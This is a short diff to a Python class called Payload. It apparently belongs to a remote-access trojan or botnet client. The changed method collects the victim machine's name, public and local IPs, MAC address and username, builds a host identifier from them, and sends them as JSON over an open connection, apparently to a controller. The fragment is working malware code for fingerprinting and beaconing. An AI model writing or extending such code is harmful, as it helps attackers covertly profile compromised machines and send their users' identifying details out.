@@ -46,14 +46,13 @@ class Payload():
 
     def _get_info(self):
         info = {}
-        
+        info['computer_name'] = computer_name()
         info['public_ip'] = public_ip()
         info['local_ip'] = local_ip()
         info['mac_address'] = mac_address()
         info['username'] = username()
         info['owner'] = self.owner
-        identity = str(info['mac_address'] + info['owner']).encode()
-        info['uid'] = hashlib.md5(identity).hexdigest()
+        info['uid'] = info['computer_name'] + '_' + info['mac_address']
         data = json.dumps(info)
         msg = struct.pack('!L', len(data)) + data.encode('utf-8')
         self.connection.sendall(msg)
